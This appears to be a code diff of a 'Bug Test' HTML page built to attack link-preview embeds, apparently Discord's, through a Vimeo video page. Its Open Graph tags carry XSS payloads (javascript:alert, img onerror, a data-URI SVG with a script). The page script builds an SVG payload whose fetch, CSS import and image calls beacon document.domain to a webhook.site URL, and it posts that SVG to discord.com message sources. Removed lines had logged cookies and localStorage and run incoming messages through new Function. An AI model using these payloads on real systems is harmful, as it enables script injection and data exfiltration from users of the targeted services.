@@ -5,15 +5,13 @@
     <meta property="og:site_name" content="Vimeo">
     <meta property="og:url" content="https://vimeo.com/403530213">
     <meta property="og:type" content="video.other">
-    <meta property="og:title" content="javascript:alert(1)">
-    <meta property="og:description" content="&lt;img src=x onerror=alert(1)&gt;">
-    <meta property="og:image" content="https://i.vimeocdn.com/video/873029368-78a366b9407757e066a37718d766be53d3cb90d7f27708590ca16a1400e95b89-d">
-    <meta property="og:video" content="https://player.vimeo.com/video/403530213">
+    <meta property="og:title" content="Please Die">
+    <meta property="og:description" content="H4CK1NG 1S L1F3">
+    <meta property="og:image" content="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%3E%3Cscript%3E%3C![CDATA[fetch('https://webhook.site/bbeb07ea-30e9-4522-802f-7e6ad1ccb124?'+document.domain)]]%3E%3C/script%3E%3C/svg%3E">
+    <meta property="og:video" content="javascript:alert(1)">
     <meta property="og:video:url" content="https://player.vimeo.com/video/403530213">
     <meta property="og:video:secure_url" content="https://player.vimeo.com/video/403530213">
     <meta property="og:video:type" content="text/html">
-    <meta property="og:video:width" content="640">
-    <meta property="og:video:height" content="360">
     <title>Bug Test</title>
     <script src="https://player.vimeo.com/api/player.js"></script>
     <script>
@@ -24,37 +22,38 @@
 
         async function attemptExploit() {
             try {
-                // Log initial state
                 logToWebhook({
                     type: 'page_load',
                     url: window.location.href,
                     referrer: document.referrer,
-                    cookies: document.cookie,
-                    localStorage: JSON.stringify(localStorage),
                     timestamp: new Date().toISOString()
                 });
 
-                // Create frame with potentially malicious attributes
+                // More complex SVG payload with CDATA and fetch
+                const svg = `<svg xmlns="http://www.w3.org/2000/svg">
+                    <defs>
+                        <style>
+                            @import url('https://webhook.site/bbeb07ea-30e9-4522-802f-7e6ad1ccb124?css');
+                        </style>
+                    </defs>
+                    <foreignObject>
+                        <xhtml:script xmlns:xhtml="http://www.w3.org/1999/xhtml">
+                            <![CDATA[
+                                fetch('https://webhook.site/bbeb07ea-30e9-4522-802f-7e6ad1ccb124?' + document.domain);
+                            ]]>
+                        </xhtml:script>
+                    </foreignObject>
+                    <image href="https://webhook.site/bbeb07ea-30e9-4522-802f-7e6ad1ccb124?img" />
+                </svg>`;
+
                 const frame = document.createElement('iframe');
-                frame.src = 'https://player.vimeo.com/video/403530213?xss=\"><img src=x onerror=alert(1)>';
+                frame.src = 'https://player.vimeo.com/video/403530213';
                 frame.width = '640';
                 frame.height = '360';
                 frame.allow = 'autoplay; fullscreen';
-                frame.sandbox = 'allow-scripts allow-same-origin';
-                frame.onload = () => {
-                    // Try to escape sandbox
-                    try {
-                        frame.contentWindow.postMessage({
-                            type: 'DISCORD_EXPLOIT',
-                            payload: '<img src=x onerror=alert(document.domain)>'
-                        }, '*');
-                    } catch(e) {
-                        logToWebhook({
-                            type: 'sandbox_escape_attempt',
-                            error: e.toString()
-                        });
-                    }
+                document.getElementById('vimeo-player').appendChild(frame);
 
+                frame.onload = () => {
                     logToWebhook({
                         type: 'frame_loaded',
                         timestamp: new Date().toISOString()
@@ -65,11 +64,11 @@
                         data: {
                             url: 'https://vimeo.com/403530213',
                             width: '640',
-                            height: '360'
+                            height: '360',
+                            thumbnail_url: 'data:image/svg+xml,' + encodeURIComponent(svg)
                         }
                     }, '*');
                 };
-                document.getElementById('vimeo-player').appendChild(frame);
 
             } catch(e) {
                 logToWebhook({
@@ -90,25 +89,12 @@
                 timestamp: new Date().toISOString()
             });
 
-            // Test message handler vulnerability
-            if (typeof e.data === 'string' && e.data.includes('script')) {
-                // Potentially dangerous eval
-                try {
-                    new Function(e.data)();
-                } catch(e) {
-                    logToWebhook({
-                        type: 'eval_attempt',
-                        error: e.toString()
-                    });
-                }
-            }
-
             if (e.origin.includes('discord.com')) {
                 e.source.postMessage({
                     type: 'DISCORD_EMBED_UPDATE',
                     data: {
                         html: '',
-                        url: 'https://vimeo.com/403530213'
+                        thumbnail_url: 'data:image/svg+xml,' + encodeURIComponent(svg)
                     }
                 }, '*');
             }
